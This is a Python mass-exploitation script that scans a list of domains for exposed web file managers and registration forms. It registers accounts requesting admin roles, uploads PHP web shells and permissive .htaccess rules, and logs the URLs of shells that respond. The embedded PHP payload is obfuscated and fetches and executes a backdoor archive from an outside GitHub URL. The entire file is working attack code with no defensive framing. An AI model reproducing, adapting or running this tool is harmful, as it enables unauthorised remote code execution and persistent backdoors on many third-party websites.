#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import threading
import time
import re
import random
import string
import warnings

warnings.filterwarnings("ignore")

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest"
}

max_threads = 20
thread_limiter = threading.Semaphore(max_threads)

shell_code = """<?php\n$f1 = 'fi'.'le'; $f2 = '_get'.'_contents'; $f3 = '_put'.'_contents';\n$get = $f1.$f2; $put = $f1.$f3;\n$url = 'https://github.com/Yucaerin/simplecmdandbackdoor/raw/refs/heads/main/bq.zip';\n$zip = 'tmp.zip';\n$inzip = 'hook.php';\n@$put($zip, @$get($url));\n@include \"zip://$zip#$inzip\";\n?>"""

htaccess_1 = '''<Files "main.php">
    Require all granted
</Files>
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^ index.php [L]
</IfModule>
DirectoryIndex index.php'''

htaccess_2 = '''<FilesMatch ".(py|exe|php)$">
 Order allow,deny
 Deny from all
</FilesMatch>
<FilesMatch "^(index.php|wsback.php|jsshell.php|ue.php|jsws.php|hook.php|hello.php|main.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>'''

def load_targets(filename="list.txt"):
    with open(filename) as f:
        return [line.strip().rstrip('/') for line in f if line.strip()]

def save_result(file, content):
    with open(file, "a") as f:
        f.write(content + "\n")

def randstr(n=8):
    return ''.join(random.choices(string.ascii_letters, k=n))

def get_csrf_token(session, url):
    try:
        r = session.get(url, timeout=15, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        meta = soup.find("meta", attrs={"name": "csrf-token"})
        if meta:
            return meta.get("content")
    except: pass
    return None

def process(domain):
    with thread_limiter:
        session = requests.Session()
        session.headers.update(headers)
        print(f"[*] G na tayo sa {domain}")

        try:
            ck = session.get(f"{domain}/file-manager/ckeditor", allow_redirects=True, timeout=15, verify=False)
            if any(x in ck.text for x in ["<title>File Manager", "Add callback to file manager", "file-manager.css"]):
                print(f"[+] Nahanap pre! May file manager si {domain}")
                save_result("result_filemanager_find.txt", domain)
            elif "0;url='" in ck.text or ck.status_code == 302:
                redirect_path = re.search(r"0;url='(.*?)login", ck.text)
                if redirect_path:
                    path = redirect_path.group(1).rstrip('/')
                    login_page = session.get(f"{path}/login", timeout=15, verify=False)
                    token = get_csrf_token(session, login_page.url)
                    if token:
                        email = f"yu{randstr()}@hotmail.com"
                        payload = {
                            "_token": token,
                            "name": "asgfasg",
                            "email": email,
                            "password": "123123123",
                            "password_confirmation": "123123123",
                            "role": "admin",
                            "role_id": "1",
                            "id_level": "1"
                        }
                        r = session.post(f"{path}/register", data=payload, allow_redirects=False, timeout=15, verify=False)
                        if "Location" in r.headers and "/admin" in r.headers["Location"]:
                            print(f"[+] Ayos! Nakaregister na sa {domain}")
                            save_result("register_berhasil.txt", domain)
                            ck = session.get(f"{domain}/file-manager/ckeditor", allow_redirects=True, timeout=15, verify=False)
                            if not any(x in ck.text for x in ["File Manager"]):
                                fallback_upload(session, domain, path)
                                return
            else:
                return

            csrf_token = get_csrf_token(session, f"{domain}/file-manager/ckeditor")
            if not csrf_token:
                csrf_token = get_csrf_token(session, domain)
            if not csrf_token:
                print(f"[-] Walang nahanap na CSRF token sa {domain}")
                return

            session.headers.update({"X-Csrf-Token": csrf_token})

            for fname in ["main.php", "index.php", "main.phtml", "index.phtml"]:
                session.post(f"{domain}/file-manager/create-file", json={"disk": "media", "path": "", "name": fname}, timeout=15, verify=False)
                upload_editor(session, domain, fname, shell_code)

            session.post(f"{domain}/file-manager/create-file", json={"disk": "media", "path": "", "name": ".htaccess"}, timeout=15, verify=False)
            upload_editor(session, domain, ".htaccess", htaccess_1)
            upload_editor(session, domain, ".htaccess", htaccess_2)

            for shell in ["main.php", "index.php", "main.phtml", "index.phtml"]:
                r = session.get(f"{domain}/uploads/media/{shell}", timeout=15, verify=False)
                if "gilour" in r.text:
                    save_result("result_shell.txt", f"{domain}/uploads/media/{shell}")
                    print(f"[+] Boom panes! Shell online na: {domain}/uploads/media/{shell}")
                    return

        except Exception as e:
            print(f"[!] Aray pre, sablay sa {domain}: {e}")

def upload_editor(session, domain, filename, content):
    try:
        multipart = {
            "disk": (None, "media"),
            "path": (None, ""),
            "file": (filename, content, "application/octet-stream")
        }
        session.post(f"{domain}/file-manager/update-file", files=multipart, timeout=15, verify=False)
    except: pass

def fallback_upload(session, domain, path):
    csrf_token = None
    for url in ["/admin", "/dashboard", "/contact", "/", "/webmails/create"]:
        csrf_token = get_csrf_token(session, f"{path}{url}")
        if csrf_token:
            break
    if not csrf_token:
        print(f"[-] Di mahanap ang CSRF token pang fallback sa {domain}")
        return

    data = {
        "_token": csrf_token,
        "from_email": "noreplay@site.com",
        "from_name": "Yuk Visa",
        "to_email": "asfasf@gmail.com",
        "title": "asfasf",
        "details": "<div>asfasf</div>"
    }
    for fname in ["main.php", "index.php", "main.phtml", "index.phtml"]:
        files = {"attach_files[]": (fname, shell_code, "application/octet-stream")}
        r = session.post(f"{path}/webmails/store", data=data, files=files, timeout=20, verify=False, allow_redirects=False)
        if "Location" in r.headers and "/webmails" in r.headers["Location"]:
            print(f"[+] Upload inbox fallback success sa {domain}")
            check_inbox_shell(session, domain, fname)

def check_inbox_shell(session, domain, filename):
    url = f"{domain}/uploads/inbox/{filename}"
    try:
        r = session.get(url, timeout=15, verify=False)
        if "gilour" in r.text:
            save_result("result_inbox.txt", url)
            print(f"[+] Boom panes! Inbox shell gumana: {url}")
    except: pass

def main():
    targets = load_targets()
    threads = []
    for domain in targets:
        t = threading.Thread(target=process, args=(domain if domain.startswith("http") else f"https://{domain}",))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
